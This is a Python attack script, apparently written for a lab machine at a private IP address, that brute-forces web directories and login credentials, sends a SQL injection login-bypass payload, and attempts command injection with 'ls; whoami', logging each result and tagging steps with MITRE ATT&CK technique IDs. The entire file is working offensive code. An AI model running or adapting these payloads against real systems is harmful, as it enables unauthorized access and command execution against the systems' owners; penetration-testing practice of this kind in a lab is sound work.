import requests as re
import logging
from datetime import datetime

# Set up logging
log_file_path = "/var/log/exploit_logs.txt"
logging.basicConfig(
    filename=log_file_path,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

base_url = "http://192.168.134.128"

def brute_force_directories(base_url, paths):
    logging.info("Starting directory brute-forcing...")
    for path in paths:
        url = f"{base_url}/{path}"
        response = re.get(url)
        if response.status_code == 200:
            logging.info(f"Found accessible path: {url}")
        else:
            logging.warning(f"{url} - Not accessible")

# SQL Injection (T1190) Exploitation
def sql_injection(base_url):
    logging.info("Testing for SQL injection vulnerability (T1190)...")
    url = f"{base_url}/login"
    payload = {"username": "admin'--", "password": "password"}
    response = re.post(url, data=payload)

    if "welcome" in response.text.lower():
        logging.info(f"SQL Injection (T1190) successful with payload: {payload}")
    else:
        logging.warning("SQL Injection (T1190) failed.")

def brute_force_login(base_url, usernames, passwords):
    logging.info("Starting brute-force login...")
    for username in usernames:
        for password in passwords:
            payload = {"username": username, "password": password}
            response = re.post(f"{base_url}/login", data=payload)
            if "welcome" in response.text.lower():
                logging.info(f"Successful login: {username}:{password}")
                return
            else:
                logging.warning(f"Failed login: {username}:{password}")

# Command Injection (T1059) Exploitation
def command_injection(base_url):
    logging.info("Testing for Command Injection (T1059)...")
    url = f"{base_url}/exec"
    payload = {"cmd": "ls; whoami"}
    response = re.post(url, data=payload)

    if "root" in response.text or "user" in response.text:
        logging.info("Exploit: Command Injection (T1059) successful!")
    else:
        logging.warning("Exploit: Command Injection (T1059) failed.")

paths = ["admin", "login", "test", "backup"]
usernames = ["admin", "user", "guest"]
passwords = ["12345", "password", "admin"]

brute_force_directories(base_url, paths)
sql_injection(base_url)
brute_force_login(base_url, usernames, passwords)
command_injection(base_url)

logging.info("Script execution completed.")
